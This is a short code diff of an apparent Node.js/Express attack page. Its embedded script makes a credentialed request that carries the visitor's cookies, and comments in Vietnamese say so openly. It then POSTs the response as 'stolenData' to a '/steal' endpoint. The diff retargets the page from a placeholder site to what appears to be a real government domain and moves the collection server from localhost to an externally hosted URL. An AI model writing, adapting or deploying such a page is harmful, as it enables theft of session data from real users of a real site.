@@ -16,12 +16,12 @@ app.get("/", (req, res) => {
         </head>
         <body>
             <script>
-                fetch("https://siteA.com/api/userinfo", {
+                fetch("https://cds.hagiang.gov.vn/", {
                     credentials: "include" // Gửi cookie của nạn nhân
                 })
                 .then(response => response.text())
                 .then(data => {
-                    fetch("http://localhost:3006/steal", { // Gửi dữ liệu về server của bạn
+                    fetch("https://test-xss.onrender.com/steal", { // Gửi dữ liệu về server của bạn
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify({ stolenData: data })
